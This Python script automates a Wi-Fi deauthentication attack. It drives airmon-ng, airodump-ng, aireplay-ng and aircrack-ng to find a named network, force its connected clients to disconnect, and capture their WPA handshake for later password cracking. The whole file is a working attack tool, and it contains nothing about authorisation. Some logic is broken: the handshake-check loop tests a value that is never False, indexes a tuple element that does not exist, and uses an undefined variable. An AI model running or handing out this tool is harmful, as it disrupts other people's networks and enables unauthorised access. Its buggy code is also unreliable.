import argparse                         # parse flags
import os                               # check for directories, open processes
import subprocess                       # open processes
import time                             # sleep
from datetime import datetime as dt     # output time
from difflib import get_close_matches   # for network guesses
from termcolor import colored           # some colors for ya

# Parsing values ------------------ Start
parser = argparse.ArgumentParser(description="Automatically capture handshake")
parser.add_argument("ssid", metavar="NETWORK_NAME", help="Network name")
parser.add_argument("-i", metavar="INTERFACE", default="", help="Interface")
parser.add_argument("--conf", metavar="CONFIDENCE", type=float, default=0.6, help="Confidence in guessing network name from 0 to 1 (default = 0.6)")
parser.add_argument("--pack", metavar="PACKETS", type=int, default=10, help="Amount of packets to send (default = 10)")
parser.add_argument("--dir", metavar="DIRECTORY", default="", help="Directory, in which .cap file is stored (default = mydirectory/wifis/NETWORK_NAME/)")
parser.add_argument("--nokill", default=False, action="store_true", help="Specify if you don't want to kill processes. May not work depending upon your software/firmware")

args = parser.parse_args()
# Parsed values ------------------- End


# Parsed variables ------------------------- Start
Interface = args.i
SSID = args.ssid
Confidence = args.conf  # How confident script must be in guessing network name
DeauthPacketsAmount = args.pack

MY_DIRECTORY = os.popen("pwd").read()
SaveTo = "{}/wifis/".format(MY_DIRECTORY[:-1])
if args.dir != "":
	SaveTo = args.dir

KillProcesses = not args.nokill
# Parsed variables ------------------------- End


# Custom functions ------------------------- Start
def select_interface(interface_name):
	Interfaces = []
	InterfaceIndex = type(int)

	command_find_interfaces = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
	interfaces = os.popen(command_find_interfaces).read().split("\n")[:-1]
	if len(interfaces) < 3:
		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored('ERROR', 'red') + "] No interfaces")
		exit()
	index = 0
	for interface in interfaces:
		if interface != "lo" and interface != "eth0":
			command_set_interface_up = "sudo ifconfig {} up".format(interface)
			os.popen(command_set_interface_up).read()
			time.sleep(2)
			Interfaces.append(interface)
			index += 1
	if args.i != "":
		if interface_name in Interfaces:
			return interface_name
		else:
			print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] No such interface {}".format(interface_name))
			exit()

	if len(Interfaces) > 1:
		while interface_name == "":
			print("Choose interface: ")
			i = 0
			chosen = ""
			for interface in Interfaces:
				print(interface + " ({})".format(i))
				i += 1
			InterfaceIndex = int(input())
			if len(Interfaces) > InterfaceIndex:
				return Interfaces[InterfaceIndex]
			else:
				print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("WARNING", "yellow") + "] You picked the wrong house fool")
	else:
		InterfaceIndex = 0
		return Interfaces[0]


def get_name_by_phy(interface_phy_id):
	return os.popen("sudo airmon-ng | egrep {} |".format(interface_phy_id) + " awk '{print $2}'").read()[:-1]


def get_phy_by_name(interface_name):
	return os.popen("sudo airmon-ng | egrep {} |".format(interface_name) + " awk '{print $1}'").read()[:-1]


def monitor_mode(interface_name):
	command_get_mode = "sudo iwconfig {} | awk -F: '/Mode/{{print$2}}'".format(interface_name)
	output_get_mode = os.popen(command_get_mode).read().split(" ", 1)[0]
	if output_get_mode == "Monitor":
		return True
	else:
		return False


def start_network_manager():
	if "Unit dhcpcd.service" in os.popen("sudo systemctl start dhcpcd 2>&1").read():
		os.popen("sudo systemctl start NetworkManager").read()


def start_airmon(interface_name, kill_wifi):
	if kill_wifi:
		os.popen("sudo airmon-ng check kill").read()
	interface_phy = get_phy_by_name(interface_name)
	os.popen("sudo airmon-ng start {}".format(interface_name)).read()
	interface_new = get_name_by_phy(interface_phy)
	print("[" + colored(str(dt.now().time()).split(".")[0], "blue") + "] [" + colored("INFO", "green") + "] Changed interface: {}".format(interface_new))
	return interface_new


def stop_airmon(interface_name):
	interface_phy = get_phy_by_name(interface_name)
	os.popen("sudo airmon-ng stop '{}'".format(interface_name)).read()
	interface_new = get_name_by_phy(interface_phy)
	print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("INFO", "green") + "] Changed interface: {}".format(interface_new))
	return interface_new


def get_network_info(interface_name, network_name, guessing_confidence):
	BSSID = ""
	Channel = ""
	output_scan_wifi = os.popen("""sudo iwlist {} scan | egrep 'ESSID:|Address:|Channel:' | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' 2>&1""".format(interface_name)).read()
		
	splited_output_scan_wifi = output_scan_wifi.split("\n")
	if not splited_output_scan_wifi:
		time.sleep(5)
		output_scan_wifi = os.popen(command_scan_wifi).read()
		splited_output_scan_wifi = output_scan_wifi.split("\n")

	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]

	if not splited_output_scan_wifi:
		print("[" + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] No networks found. If you see 'Device or resource busy' or 'Resource temporarily unavailable' error above, disconnecting any network and closing network manager window might help.")
		exit()

	wifiNames = []

	index = 1
	for record in splited_output_scan_wifi:
		if record == network_name:
			BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-2]
			Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-1])
			return [network_name, BSSID, Channel]

		elif index == 3:
			wifiNames.append(record)
			index = 0
		index += 1

	try:
		closeMatch = get_close_matches(network_name, wifiNames, 1, Confidence)[0]
		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("WARNING", "yellow") + "] No such network '{}', assuming you typed '{}'".format(network_name, closeMatch))
		return [closeMatch, BSSID, Channel]
	except IndexError:
		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] Error scanning for network (network name is incorrect)")
		exit()


def start_airodump(interface_name, BSSID, channel, directory):
	command_airodump = "sudo airodump-ng --bssid '{}' -c '{}' --write-interval 1 --write '{}' {} > /dev/null 2>&1".format(BSSID, channel, directory, interface_name)
	airodumpProcess = subprocess.Popen(command_airodump, shell=True)


def fill_stations_from_csv(directory):
	stations = []
	with open("{}-01.csv".format(directory), 'r') as csvfile:
		for idx, val in enumerate(csvfile):
			if idx + 1 > 5:
				v = val.split(',')[0]
				if v != "\n" and v != "\r\n":
					stations.append(v)
	return stations


def select_station(stations, current_station_address):
	if current_station_address == "":
		return stations[0]
	else:
		new_station_address = stations[stations.index(current_station_address)+1]
		del stations[stations.index(current_station_address)]
		return new_station_address


def deauthNetwork(interface_name, BSSID, station, deauth_packets):
	command_aireplay = "sudo aireplay-ng --ignore-negative-one --deauth {} -a {} -c {} {} > /dev/null 2>&1".format(deauth_packets, BSSID, station, interface_name)
	deauthProcess = subprocess.Popen(command_aireplay, shell=True).wait()


def make_directory(directory, network_name):
	directory_path = directory
	directory_path += "{}/".format(network_name)
	if os.path.isdir(directory_path):
		if len(os.listdir(directory_path)) > 0:
			index = 1
			while os.path.isdir(directory_path):
				if index >= 2:
					directory_path = directory_path[:-1]
				directory_path = directory_path[:-1]
				directory_path += str(index) + '/'
				index += 1
			os.makedirs(directory_path)
	else:
		os.makedirs(directory_path)
	return directory_path


def check_handshake(directory):
	command_aircrack_output = type(int)
	command_aircrack_output = ''
	try:
		command_aircrack = "sudo aircrack-ng {}-01.cap 2>&1 | sed -n '3p' | tr -s ' '".format(directory)
		command_aircrack_output = os.popen(command_aircrack).read()
	except IndexError:
		command_aircrack = "sudo aircrack-ng {}-01.cap 2>&1 | sed -n '4p' | tr -s ' '".format(directory)
		command_aircrack_output = os.popen(command_aircrack).read()
	if command_aircrack_output == "Invalid packet capture length 0 - corrupted file?\n":
		return False, "Corrupted file"
	try:
		command_aircrack = "sudo aircrack-ng {}-01.cap | sed -n '7p' | tr -s ' ' | tr -d '()\n'".format(directory)
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	except IndexError:
		command_aircrack = "sudo aircrack-ng {}-01.cap | sed -n '6p' | tr -s ' ' | tr -d '()\n'".format(directory)
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	if command_aircrack_output > 0:
		return True, "Success"
	else:
		return False, "No handshake"


def check_for_stations(directory):
	startTime = time.time()
	index = 1
	while True:
		if index != 1:
			# check output
			stations = fill_stations_from_csv(directory)
			if len(stations) > 0:
				current_station_address = select_station(stations, "")
				print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("INFO", "green") + "] Stations: {}".format(stations))
				return stations, current_station_address
		index += 1
		time.sleep(3.0 - ((time.time() - startTime) % 3.0))
# Custom functions ------------------------- End


# MAIN ---------------------------------- Start
def recieveHandshake(interface_name, network_name, directory, guessing_confidence = 0.6, deauth_packets = 10, kill_wifi = True):
	if monitor_mode(interface_name):
		interface_name = stop_airmon(interface_name)
		if kill_wifi:
			start_network_manager()
			time.sleep(5)
	NetworkName, BSSID, Channel = get_network_info(interface_name, network_name, guessing_confidence)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] [SSID: {}] [BSSID: {}] [Channel: {}]'.format(NetworkName, BSSID, Channel))
	Directory = make_directory(directory, NetworkName)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Directory: {}'.format(Directory))
	interface_name = start_airmon(interface_name, kill_wifi)
	start_airodump(interface_name, BSSID, Channel, Directory)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Waiting for station...')
	time.sleep(1)
	Stations, CurrentStation = check_for_stations(Directory)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(deauth_packets, CurrentStation))
	deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
	cyclesCount = 0
	while check_handshake(Directory)[1] is False:
		if check_handshake(Directory)[2] == "Corrupted file":
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] Capture file is currupted. Please restart the script')
			interface_name = stop_airmon(interface_name)
			if kill_wifi:
				start_network_manager()
			exit()
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + '] Failure')
		if len(Stations) > 0 and cyclesCount < len(Stations):
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Selecting another station')
			CurrentStation = select_station(Stations, CurrentStation)
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(deauth_packets, CurrentStation))
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount += 1
		else:
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Rescanning stations...')
			Stations, CurrentStation = check_for_stations(Directory)
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(deauth_packets, CurrentStation))
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount = 1
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue', attrs=['bold']) + '] [' + colored('INFO', 'green', attrs=['bold']) + '] ' + colored('Success!', attrs=['bold']))
	interface_name = stop_airmon(interface_name)
	if kill_wifi:
		start_network_manager()
	return Directory

if __name__ == "__main__":
	Interface = select_interface(Interface)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Interface: {}'.format(Interface))
	recieveHandshake(Interface, SSID, SaveTo, Confidence, DeauthPacketsAmount, KillProcesses)
# MAIN ---------------------------------- END
